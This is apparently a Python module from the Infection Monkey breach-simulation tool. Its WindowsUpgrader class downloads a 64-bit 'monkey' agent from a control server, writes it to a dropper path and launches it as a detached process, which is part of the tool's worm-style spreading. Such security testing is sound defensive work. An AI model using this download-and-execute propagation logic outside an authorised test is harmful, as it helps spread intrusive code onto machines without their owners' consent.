import logging
import shutil
import subprocess
import sys
import time

import infection_monkey.monkeyfs as monkeyfs
from infection_monkey.config import WormConfiguration
from infection_monkey.control import ControlClient
from infection_monkey.exploit.tools.helpers import \
    build_monkey_commandline_explicitly
from infection_monkey.model import MONKEY_CMDLINE_WINDOWS
from infection_monkey.utils.environment import (is_64bit_python,
                                                is_64bit_windows_os,
                                                is_windows_os)

__author__ = 'itay.mizeretz'

LOG = logging.getLogger(__name__)

if "win32" == sys.platform:
    from win32process import DETACHED_PROCESS
else:
    DETACHED_PROCESS = 0


class WindowsUpgrader(object):
    __UPGRADE_WAIT_TIME__ = 3

    @staticmethod
    def should_upgrade():
        return is_windows_os() and is_64bit_windows_os() \
               and not is_64bit_python()

    @staticmethod
    def upgrade(opts):
        try:
            monkey_64_path = ControlClient.download_monkey_exe_by_os(True, False)
            with monkeyfs.open(monkey_64_path, "rb") as downloaded_monkey_file:
                with open(WormConfiguration.dropper_target_path_win_64, 'wb') as written_monkey_file:
                    shutil.copyfileobj(downloaded_monkey_file, written_monkey_file)
        except (IOError, AttributeError) as e:
            LOG.error("Failed to download the Monkey to the target path: %s." % e)
            return

        monkey_options = build_monkey_commandline_explicitly(opts.parent, opts.tunnel, opts.server, opts.depth)

        monkey_cmdline = MONKEY_CMDLINE_WINDOWS % {
            'monkey_path': WormConfiguration.dropper_target_path_win_64} + monkey_options

        monkey_process = subprocess.Popen(monkey_cmdline, shell=True,
                                          stdin=None, stdout=None, stderr=None,
                                          close_fds=True, creationflags=DETACHED_PROCESS)

        LOG.info("Executed 64bit monkey process (PID=%d) with command line: %s",
                 monkey_process.pid, monkey_cmdline)

        time.sleep(WindowsUpgrader.__UPGRADE_WAIT_TIME__)
        if monkey_process.poll() is not None:
            LOG.error("Seems like monkey died too soon")
